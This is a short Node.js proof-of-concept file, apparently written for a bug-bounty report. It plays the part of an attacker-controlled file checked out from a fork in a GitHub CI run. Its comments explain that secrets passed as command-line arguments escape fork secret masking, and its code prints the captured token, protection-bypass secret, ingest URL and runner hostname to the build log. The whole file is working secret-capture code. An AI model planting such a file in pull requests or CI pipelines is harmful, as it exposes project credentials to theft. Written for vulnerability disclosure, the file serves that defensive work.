"use strict";
// H1 PoC -- attacker-controlled file (checked out from fork HEAD).
// GitHub fork secret masking applies to env vars ONLY.
// Secrets passed as CLI --args land in process.argv regardless of fork settings.
const args = process.argv.slice(2);
const argMap = {};
for (let i = 0; i < args.length; i += 2) { argMap[args[i]] = args[i+1] || ""; }
console.log("=== H1 PoC: CAPTURED SECRETS VIA process.argv ===");
console.log("process.argv: " + JSON.stringify(process.argv));
console.log("--token: " + (argMap["--token"] || "(empty)"));
console.log("--protection-bypass-secret: " + (argMap["--protection-bypass-secret"] || "(empty)"));
console.log("--ingest-url: " + (argMap["--ingest-url"] || "(empty)"));
console.log("runner hostname: " + require("os").hostname());
console.log("=== END H1 PoC ===");
